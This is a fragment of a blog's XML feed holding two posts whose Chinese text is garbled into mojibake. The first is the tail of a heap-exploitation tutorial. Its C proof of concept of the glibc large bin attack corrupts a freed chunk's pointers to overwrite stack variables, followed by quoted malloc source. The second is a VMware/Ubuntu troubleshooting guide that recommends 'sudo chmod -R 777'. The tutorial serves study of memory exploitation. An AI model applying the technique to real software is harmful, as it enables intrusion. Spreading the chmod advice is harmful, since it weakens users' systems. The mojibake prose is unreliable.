†å—çš„è¿™ä¸¤ä¸ªæŒ‡é’ˆå‡ä¸º0ã€‚size æœ€å¤§çš„å †å—çš„ bk_nextsize æŒ‡å‘æœ€å°çš„å †å—ï¼Œsize æœ€å°çš„å †å—çš„ fd_nextsize æŒ‡å‘æœ€å¤§çš„å †å—</p><h3 id="ç¤ºä¾‹-1"><a href="#ç¤ºä¾‹-1" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var1 = <span class="hljs-number">0</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var2 = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x320</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);   <span class="hljs-comment">//é˜²æ­¢åˆå¹¶ï¼Œä¸‹åŒ</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-built_in">free</span>(p1);<br><span class="hljs-built_in">free</span>(p2);<br><br> <span class="hljs-type">void</span>* p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br> <span class="hljs-built_in">free</span>(p3);<br><br> p2[<span class="hljs-number">-1</span>] = <span class="hljs-number">0x3f1</span>;    <span class="hljs-comment">//size è®¾ç½®ä¸º 0x3f1</span><br> p2[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;   <span class="hljs-comment">//fd ç½®ç©º</span><br> p2[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;   <span class="hljs-comment">//fd_nextsize ç½®ç©º</span><br>p2[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var1 - <span class="hljs-number">2</span>);  <span class="hljs-comment">//bk ä¿®æ”¹ä¸º stack_var1_addr - 0x10</span><br>p2[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var2 - <span class="hljs-number">4</span>);  <span class="hljs-comment">//bk_nextsize ä¿®æ”¹ä¸º stack_var1_addr - 0x20</span><br><br> <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br> <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="hljs-type">void</span> *)stack_var1);<br> <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="hljs-type">void</span> *)stack_var2);<br> <br> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> &#125;<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€è½® malloc ç»“æŸï¼Œå †ç»“æ„å¦‚ä¸‹ï¼Œp1ã€p2ã€p3 çš„åœ°å€åˆ†åˆ«æ˜¯ 0x602000 ã€ 0x602360 ã€ 0x6027a0</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb1.png"></p><p>é‡Šæ”¾æ‰ p1 å’Œ p2ï¼Œä¸¤ä¸ªå †å—éƒ½è¿›å…¥ unsortedbin ä¸­ ï¼Œè¦æ³¨æ„çš„æ˜¯ï¼Œp1 çš„å¤§å°æ˜¯ 0x330 å¤§å°å±äº small binï¼Œè€Œ p2 çš„å¤§å°æ˜¯ 0x410 å±äº large bin</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb2.png"></p><p>ç”¨ <code>malloc(0x90);</code> åˆ†å‰²å †å—ï¼Œæ‰€ä»¥åŸæœ¬çš„å †å—è¢«åˆ†å‰²ï¼Œå‰©ä½™çš„éƒ¨åˆ†è¿›å…¥äº† largebin ã€‚</p><p>å®é™…ä¸Šè¯¦ç»†çš„æµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>ä» unsorted bin ä¸­æ‹¿å‡ºæœ€åä¸€ä¸ª chunkï¼ˆp1 å±äº small bin çš„èŒƒå›´ï¼‰</li><li>æŠŠè¿™ä¸ª chunk æ”¾å…¥ small bin ä¸­ï¼Œå¹¶æ ‡è®°è¿™ä¸ª small bin æœ‰ç©ºé—²çš„ chunk</li><li>å†ä» unsorted bin ä¸­æ‹¿å‡ºæœ€åä¸€ä¸ª chunkï¼ˆp2 å±äº large bin çš„èŒƒå›´ï¼‰</li><li>æŠŠè¿™ä¸ª chunk æ”¾å…¥ large bin ä¸­ï¼Œå¹¶æ ‡è®°è¿™ä¸ª large bin æœ‰ç©ºé—²çš„ chunk</li><li>ç°åœ¨ unsorted bin ä¸ºç©ºï¼Œä» small bin ï¼ˆp1ï¼‰ä¸­åˆ†é…ä¸€ä¸ªå°çš„ chunk æ»¡è¶³è¯·æ±‚ 0x90ï¼Œå¹¶æŠŠå‰©ä¸‹çš„ chunkï¼ˆ0x330 - 0xa0ï¼‰æ”¾å…¥ unsorted bin ä¸­</li></ul><p>æ‰€ä»¥ä¼šå‡ºç°ä¸‹å›¾çš„å †ç»“æ„ï¼šunsorted bin ä¸­æœ‰ä¸€ä¸ª chunk å¤§å°æ˜¯ 0x330 - 0xa0 &#x3D; 0x290 ï¼›large bin æŸä¸€ä¸ªåºåˆ—çš„ bin ä¸­æœ‰ä¸€ä¸ª chunk å¤§å°æ˜¯ 0x410</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb3.png"></p><p>free æ‰ p3 ï¼Œp3 è¿›å…¥ unsortedbin</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb4.png"></p><p>æ¥ä¸‹æ¥ä¿®æ”¹ p2 çš„ä¿¡æ¯ï¼Œä¿®æ”¹å‰åä¾æ¬¡å¦‚ä¸‹å›¾</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb5.png"></p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb6.png"></p><p>ä¿®æ”¹åçš„ç»“æœå¦‚ä¸‹ï¼š</p><table><thead><tr><th>size</th><th>fd</th><th>bk</th><th>fd_nextsize</th><th>bk_nextsize</th></tr></thead><tbody><tr><td>0x3f1</td><td>0</td><td>stack_var1_addr - 0x10</td><td>0</td><td>stack_var2_addr - 0x20</td></tr></tbody></table><p>æˆ‘ä»¬è®°è¿™ä¸ª stack_var1 - 0x10 ä¸º fakechunk1ï¼Œæ­¤æ—¶ stack_var1 - 0x10 çš„ fd æŒ‡é’ˆæŒ‡å‘ fakechunk1 ï¼ŒåŒæ—¶ stack_var2 - 0x20 ä¸º fakechunke2 ï¼Œæ­¤æ—¶ stack_var2 - 0x20 çš„ fd æŒ‡é’ˆæŒ‡å‘ fakechunk2ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å†æ¬¡ <code>malloc(0x90)</code>, p3 æŒ‚è¿›äº† largebin</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/large_gdb7.png"></p><p>å…·ä½“æœ‰å…³è¿™ä¸ªéƒ¨åˆ†çš„ malloc ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br>        unsorted_chunks (av)-&gt;bk = bck;<br>        bck-&gt;fd = unsorted_chunks (av);<br><br>        <span class="hljs-comment">/* Take now instead of binning if exact fit */</span><br><br>        <span class="hljs-keyword">if</span> (size == nb)<br>          &#123;<br>            set_inuse_bit_at_offset (victim, size);<br>            <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>              victim-&gt;size |= NON_MAIN_ARENA;<br>            check_malloced_chunk (av, victim, nb);<br>            <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>            alloc_perturb (p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>          &#125;<br><br>        <span class="hljs-comment">/* place chunk in bin */</span><br><br>        <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>          &#123;<br>            victim_index = smallbin_index (size);<br>            bck = bin_at (av, victim_index);<br>            fwd = bck-&gt;fd;<br>          &#125;<br>        <span class="hljs-keyword">else</span><br>          &#123;<br>            victim_index = largebin_index (size);<br>            bck = bin_at (av, victim_index);<br>            fwd = bck-&gt;fd;<br><br>            <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>            <span class="hljs-keyword">if</span> (fwd != bck)<br>              &#123;<br>                <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                size |= PREV_INUSE;<br>                <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<br>                  &#123;<br>                    fwd = bck;<br>                    bck = bck-&gt;bk;<br><br>                    victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                  &#125;<br>                <span class="hljs-keyword">else</span><br>                  &#123;<br>                    assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                    <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                      &#123;<br>                        fwd = fwd-&gt;fd_nextsize;<br>                        assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                      &#125;<br><br>                    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                      <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                      fwd = fwd-&gt;fd;<br>                    <span class="hljs-keyword">else</span><br>                      &#123;<br>                        victim-&gt;fd_nextsize = fwd;<br>                        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                        fwd-&gt;bk_nextsize = victim;<br>                        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                      &#125;<br>                    bck = fwd-&gt;bk;<br>                  &#125;<br>              &#125;<br>            <span class="hljs-keyword">else</span><br>              victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>          &#125;<br><br>        mark_bin (av, victim_index);<br>        victim-&gt;bk = bck;<br>        victim-&gt;fd = fwd;<br>        fwd-&gt;bk = victim;<br>        bck-&gt;fd = victim;<br></code></pre></td></tr></table></figure><p>è¿™æ¬¡æˆ‘ä»¬ä» unsortedbin ä¸­æ‹¿å‡ºçš„æ˜¯å±äº largebinï¼Œæ‰€ä»¥è¿›å…¥åˆ°å †å—å¤§å°åˆ¤æ–­çš„ else åˆ†æ”¯ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æŒ‡é’ˆçš„æ“ä½œï¼Œç”±äºæˆ‘ä»¬çš„ p3 è¢«æˆ‘ä»¬ä¿®æ”¹è¿‡æ•°æ®ï¼Œå°±ä¼šè·³è¿‡ while çš„å¾ªç¯ï¼Œè¿›å…¥ä¸‹é¢çš„éƒ¨åˆ†åˆ†æ”¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>&#123;<br>fwd = fwd-&gt;fd_nextsize;<br>assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>&#125;<br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br><span class="hljs-comment">/* Always insert in the second position.  */</span><br>fwd = fwd-&gt;fd;<br><span class="hljs-keyword">else</span><br>&#123;<br>victim-&gt;fd_nextsize = fwd;<br>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>fwd-&gt;bk_nextsize = victim;<br>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥åœ¨ä¸‹é¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬è¢«ä¿®æ”¹çš„æŒ‡é’ˆå°±å®Œæˆäº†åˆ©ç”¨ï¼Œä¿®æ”¹äº† stack_var1 å’Œstack_var2 çš„å€¼ã€‚</p><hr><p>è§‰å¾—å †é¢˜è¿˜æ˜¯è¦å»åˆ†æä¸€ä¸‹æºç ï¼Œæ¥ä¸‹æ¥å°±è®¡åˆ’å»çœ‹çœ‹æºç </p><p><del>å…ˆåšå‡ é“é¢˜ç»ƒç»ƒæ‰‹</del></p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¿®å¸ˆå‚…ä¿®è™šæ‹Ÿæœºç³»åˆ—</title>
    <link href="/2023/08/04/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/"/>
    <url>/2023/08/04/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/</url>
    
    <content type="html"><![CDATA[<p>çœŸçš„å»ºè®®å¤§å®¶åœ¨æ‰€æœ‰åŠŸèƒ½éƒ½å¥½ç”¨çš„æ—¶å€™å­˜ä¸€ä¸‹å¿«ç…§ğŸ‘»</p><span id="more"></span><h1 id="å®ç°è™šæ‹Ÿæœºå’Œä¸»æœºä¹‹é—´çš„æ‹–æ‹½"><a href="#å®ç°è™šæ‹Ÿæœºå’Œä¸»æœºä¹‹é—´çš„æ‹–æ‹½" class="headerlink" title="å®ç°è™šæ‹Ÿæœºå’Œä¸»æœºä¹‹é—´çš„æ‹–æ‹½"></a>å®ç°è™šæ‹Ÿæœºå’Œä¸»æœºä¹‹é—´çš„æ‹–æ‹½</h1><blockquote><p>è¿™ä¸ªè§£å†³æ–¹æ³•é€‚åˆè€ç‰ˆæœ¬æ¯”å¦‚16ï¼Œ18ã€‚æˆ‘åœ¨äº’è”ç½‘ä¸Šå†²æµªå†²äº†è¿™ä¹ˆä¹…çœ‹åˆ°å¤§å®¶éƒ½åœ¨è¯´22ç‰ˆæœ¬ä¸æ”¯æŒæ‹–æ‹½ï¼Œæ— æ‰€è°“äº†å§éº»äº†</p></blockquote><p>é¦–å…ˆéœ€è¦ç¡®ä¿è™šæ‹Ÿæœºçš„å¯ç”¨æ‹–æ”¾å’Œå¯ç”¨å¤åˆ¶ç²˜è´´é€‰é¡¹å¼€å¯</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_20-12-12.png"></p><h3 id="åªèƒ½å¤åˆ¶ç²˜è´´ä¸èƒ½æ‹–æ‹½"><a href="#åªèƒ½å¤åˆ¶ç²˜è´´ä¸èƒ½æ‹–æ‹½" class="headerlink" title="åªèƒ½å¤åˆ¶ç²˜è´´ä¸èƒ½æ‹–æ‹½"></a>åªèƒ½å¤åˆ¶ç²˜è´´ä¸èƒ½æ‹–æ‹½</h3><p>è™šæ‹Ÿæœºâ€å¯ç”¨æ‹–æ‹½â€åŠŸèƒ½å·²å¼€å¯ï¼Œä½†æ˜¯ä»æœ¬æœºå¾€è™šæ‹Ÿæœºæ‹–æ‹½æ–‡ä»¶æ—¶ä¾æ—§è¢«ç¦æ­¢ï¼</p><p>å®‰è£… open-vm-tools-desktop è½¯ä»¶ï¼Œå®ƒæ˜¯ VMware Tools å…¶ä¸­çš„ä¸€ä¸ªç»„ä»¶ï¼Œè´Ÿè´£æ”¯æŒè™šæ‹Ÿæœºå’Œä¸»æœºä¹‹é—´çš„æ‹–æ‹½ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">open</span>-<span class="hljs-keyword">vm</span>-tools-desktop<br></code></pre></td></tr></table></figure><h3 id="æ—¢ä¸èƒ½å¤åˆ¶ç²˜è´´ä¹Ÿä¸èƒ½æ‹–æ‹½"><a href="#æ—¢ä¸èƒ½å¤åˆ¶ç²˜è´´ä¹Ÿä¸èƒ½æ‹–æ‹½" class="headerlink" title="æ—¢ä¸èƒ½å¤åˆ¶ç²˜è´´ä¹Ÿä¸èƒ½æ‹–æ‹½"></a>æ—¢ä¸èƒ½å¤åˆ¶ç²˜è´´ä¹Ÿä¸èƒ½æ‹–æ‹½</h3><p><strong>é‡è£… VMware Toolsï¼</strong></p><p>é¦–å…ˆè¦å®‰è£… VMware Toolsï¼Œå¦‚æœä½ æ˜¯æ›¾ç»æœ‰è¿‡VMware Tools æŒ‰é’®ä¼šæ˜¾ç¤ºé‡æ–°å®‰è£…</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/11.png"></p><p>å¼€æœºåä¼šå‘ç°æ¡Œé¢ä¸Šæˆ–è€…ä¾§è¾¹æ å¤šäº†ä¸€ä¸ªå…‰ç›˜å›¾æ ‡ï¼Œç‚¹è¿›å»æŠŠå‹ç¼©åŒ…å¤åˆ¶åˆ°æ¡Œé¢</p><blockquote><p>ä¸‹å›¾æ˜¯ Ubuntu22ï¼Œæˆ‘çš„ Ubuntu18 æ˜¯ä¸€ä¸ªå…‰ç›˜å›¾æ ‡ç›´æ¥å‡ºç°åœ¨æ¡Œé¢ä¸Š</p></blockquote><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_16-32-05.png"></p><p>ç›´æ¥é€‰ä¸­å³é”® â€œcopy toâ€ </p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_16-37-20.png"></p><p>åœ¨æ¡Œé¢æ‰“å¼€ terminalï¼Œ </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar zxfv [vmwatr-install-name]<br></code></pre></td></tr></table></figure><p>å‡¡æ˜¯è®©ä½ å›ç­” yes æˆ–è€… no çš„éƒ½è¾“å…¥ yes å¹¶å›è½¦</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_16-50-55.png"></p><p>å‡¡æ˜¯ [&#x2F;â€¦&#x2F;â€¦] éƒ½æŒ‰å›è½¦é”®</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_16-51-21.png"></p><p>ä¸‹å›¾è¿™æ ·å°±æ˜¯å®‰è£…å¥½äº†</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_16-54-21.png"></p><h3 id="å®‰è£…VMware-Toolsé€‰é¡¹æ˜¾ç¤ºç°è‰²"><a href="#å®‰è£…VMware-Toolsé€‰é¡¹æ˜¾ç¤ºç°è‰²" class="headerlink" title="å®‰è£…VMware Toolsé€‰é¡¹æ˜¾ç¤ºç°è‰²"></a>å®‰è£…VMware Toolsé€‰é¡¹æ˜¾ç¤ºç°è‰²</h3><p>åªéœ€è¦ä»¥ä¸‹ä¸‰ä¸ªæ­¥éª¤ï¼š</p><p>1.å…³é—­è™šæ‹Ÿæœº</p><p>2.åœ¨è™šæ‹Ÿæœºè®¾ç½®åˆ†åˆ«è®¾ç½®<strong>CD&#x2F;DVDã€CD&#x2F;DVD2å’Œè½¯ç›˜ä¸‰ä¸ªéƒ¨åˆ†</strong>ä¸ºè‡ªåŠ¨æ£€æµ‹ï¼ˆå¦‚æœä½ æœ¬æ¥å°±æ˜¯è‡ªåŠ¨æ£€æµ‹ï¼Œå°±æ¢æˆVMwareå®‰è£…ç›®å½•ä¸­çš„ linux.isoï¼‰</p><p>3.å†é‡å¯è™šæ‹Ÿæœºï¼Œç°è‰²å­—å³ç‚¹äº®</p><blockquote><p>æ³¨æ„ï¼å¦‚æœå¼€æœºä»¥åè¿˜æ˜¯ä¸è¡Œï¼Œå°±é‡å¯ï¼Œè¶ç€å±å¹•æ˜¯é»‘è‰²çš„è¿˜æ²¡å‡ºç°ç™»å½•ç•Œé¢çš„æ—¶å€™å†æ¬¡æŸ¥çœ‹ï¼Œä½ å°±ä¼šå‘ç°å®ƒäº®äº†ğŸ¤—</p><p>å¿«å‡†ç‹ ï¼ç‚¹å‡»é‡æ–°å®‰è£…ï¼ï¼ï¼</p></blockquote><h3 id="å¦è¾Ÿæ–°é“è·¯"><a href="#å¦è¾Ÿæ–°é“è·¯" class="headerlink" title="å¦è¾Ÿæ–°é“è·¯"></a>å¦è¾Ÿæ–°é“è·¯</h3><p>ä¸å°±æ˜¯æƒ³åœ¨ä¸»æœºå’Œè™šæ‹Ÿæœºä¹‹é—´å…±äº«æ–‡ä»¶å˜›ï¼Œç›´æ¥æ‰“å¼€æµè§ˆå™¨ç™»é™†å¾®ä¿¡æ–‡ä»¶ä¼ è¾“åŠ©æ‰‹ä¼ è¾“æ–‡ä»¶</p><p><img src="/img/%E4%BF%AE%E5%B8%88%E5%82%85%E4%BF%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B3%BB%E5%88%97/Snipaste_2023-08-04_17-32-09.png"></p><h1 id="æ²¡æœ‰ç½‘ç»œå›¾æ ‡"><a href="#æ²¡æœ‰ç½‘ç»œå›¾æ ‡" class="headerlink" title="æ²¡æœ‰ç½‘ç»œå›¾æ ‡"></a>æ²¡æœ‰ç½‘ç»œå›¾æ ‡</h1><p>æ²¡æœ‰ç½‘ç»œå›¾æ ‡ä¹Ÿè¿ä¸ä¸Šç½‘è¾£ï¼ğŸ¤”</p><p>å…³é—­ç½‘ç»œæœåŠ¡å†åˆ é™¤æ–‡ä»¶ï¼Œæœ€åé‡æ–°å¯åŠ¨æœåŠ¡ã€‚åœ¨terminalä¸­è¾“å…¥ä»¥ä¸‹ä¸‰æ¡å‘½ä»¤å³å¯æ¢å¤</p><p>é‡å¯å¯ä»¥è§£å†³ç™¾åˆ†ä¹‹ä¹åä¹çš„é—®é¢˜ğŸ¤¤</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pf">sudo service NetworkManager stop <br> <br>sudo rm /var/lib/NetworkManager/NetworkManager.<span class="hljs-keyword">state</span> <br> <br>sudo service NetworkManager start<br></code></pre></td></tr></table></figure><blockquote><p>NetworkManager æ˜¯ 22ç‰ˆæœ¬ å¯¹åº”çš„åç§°ï¼Œä¸åŒç‰ˆæœ¬çš„ä¸ä¸€æ ·ä½†æˆ‘ä¹Ÿä¸å¤ªæ¸…æ¥šï¼Œè¯·è‡ªè¡Œç™¾åº¦</p></blockquote><h1 id="Permission-denied"><a href="#Permission-denied" class="headerlink" title="Permission denied"></a>Permission denied</h1><p>åœ¨æ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œä½ æ˜¯å¦ä¼šé‡åˆ° <code>bash: ./pwn: Permission denied</code> è¿™ç§æƒ…å†µå‘¢ï¼Ÿ</p><p>é‚£æ˜¯å› ä¸ºæ²¡æœ‰æ­£ç¡®è®¾ç½®è¯»å–æƒé™ï¼Œæˆ‘ä»¬åªéœ€è¦å°†æƒ³è¦ç”¨æˆ·æ‰§è¡Œè¯»å†™æƒé™çš„ä½ç½®å¡«å…¥ä¸‹æ–¹ <code>[]</code> ä¸­ï¼Œå†å¤åˆ¶åˆ° terminal ä¸­å°±å¯ä»¥è§£å†³é—®é¢˜äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">chmod</span> -R 777 [~/Desktop]<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>è¸©å‘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ubuntu</tag>
      
      <tag>VMware Tools</tag>
      
